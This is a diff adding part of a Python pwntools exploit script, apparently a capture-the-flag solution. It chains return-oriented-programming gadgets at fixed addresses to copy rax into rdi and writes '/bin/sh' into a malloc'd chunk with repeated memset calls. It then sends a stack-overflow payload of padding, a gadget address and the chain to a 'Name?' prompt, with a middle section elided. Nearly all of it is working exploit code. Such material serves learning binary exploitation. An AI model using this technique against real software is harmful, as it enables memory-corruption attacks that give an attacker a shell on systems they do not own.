@@ -1,0 +1,56 @@
+'''
+Performs the mov rdi, rax instruction using the ROP chain in two main steps
+1. mov r14, rax
+2. mov rdi, r14
+'''
+def mov_rax_to_rdi(ropchain):
+
+    # How this mov r14, rax works: 
+    #
+    # 1. Set rbx to 0x410ca0 so it is called
+    # 2. Call 0x44f6c8 and thus call 0x410ca0
+    # 
+    # Instrs:
+    # 0x0000000044f6c8: push rax; call rbx;
+    # 0x00000000410ca0: pop r13; pop r14; ret;
+    ropchain.rbx = 0x410ca0
+    ropchain.raw(0x44f6c8)
+
+    # How this mov rdi, r14 works: 
+    # 
+    # 1. rbp has alr been loaded with the address of a [pop r14; ret;] gadget
+    # 2. 0x45bf5b thus becomes a gadget that will return control to the chain
+    # 
+    # Instrs
+    # 0x0000000045bf5b: mov rdi, r14; call rbp;
+    # 0x00000000410ca2: pop r14; ret;
+    ropchain.raw(0x45bf5b)
+
+
+'''
+PART 1 OF THE ROP CHAIN
+- End State: rax points to the '/bin/sh' string
+'''
+# malloc a chunk to store the '/bin/sh' string
+rop_part1.malloc(16)    
+
+# Use memset to store '/bin/sh' into the malloc-ed chunk
+binsh_str = b'/bin/sh\x00'
+for byte in binsh_str: 
+
+    # mov rdi, rax
+    mov_rax_to_rdi(rop_part1)
+
+    # Set the other arguments to memset and call it
+    rop_part1.rsi = byte
+    rop_part1.rdx = 1
+    rop_part1.raw(exe.symbols.__memset_avx2_unaligned_erms) # exe.symbols.memset is just a decision-maker for which type of memset to use, which ends up being exe.symbols.__memset_avx2_unaligned_erms
+    
+    if byte != 0:
+        rop_part1.raw(0x475431) # Main point is to increment rax by 1
+
+log.info("ROP chain Part 1: \n" + rop_part1.dump())
+
+...
+
+r.sendlineafter(b'Name? ', b'A' * 0x70 + p64(0x410ca2) + rop_part1.chain())
